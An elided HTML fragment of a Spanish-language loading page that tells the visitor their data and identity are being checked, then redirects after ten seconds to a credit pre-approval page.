...
<html lang="en" >
  ...
  function redireccionar() {
    setTimeout("location.href='preaprobado.php'", 10000);
  }
  </script>
		...
		<!-- begin::Body -->
			<div class="m-grid__item m-grid__item--fluid m-grid m-grid--hor-desktop m-grid--desktop m-body">
						...
						<div class="" style="text-align:center">
							<center>
							<div class="col-md-6">
								<img src="crediscore.gif" alt="" width="100%">
							</div>


								<div class="m-blockui" style="text-align:center">
									<span>
										Espere, Comprobando datos...
									</span>
									<span>
										<div class="m-loader m-loader--brand"></div>
									</span>
								...
								<div class="col-md-6">
									<span style="color:#7a7b7f">No cierre o actualice esta ventana estamos Verificando su identidad.</span>
								</div>
